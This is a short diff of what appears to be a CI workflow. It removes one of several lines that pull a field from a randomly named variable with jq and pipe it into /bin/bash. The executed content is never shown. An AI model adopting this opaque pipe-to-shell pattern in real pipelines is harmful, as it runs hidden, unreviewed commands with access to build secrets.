@@ -37,7 +37,6 @@ jobs:
           echo $syus237 | jq -r .v505 | /bin/bash
           echo $xypq60948 | jq -r .qe86 | /bin/bash
           echo $k64400 | jq -r .mu03 | /bin/bash
-          printf '%s' "$pwq3" | jq -r .qj6487 | /bin/bash
           echo $svfw9 | jq -r .ii00 | /bin/bash
           echo $nv5677 | jq -r .mitl4 | /bin/bash
           echo $e23 | jq -r .p86 | /bin/bash
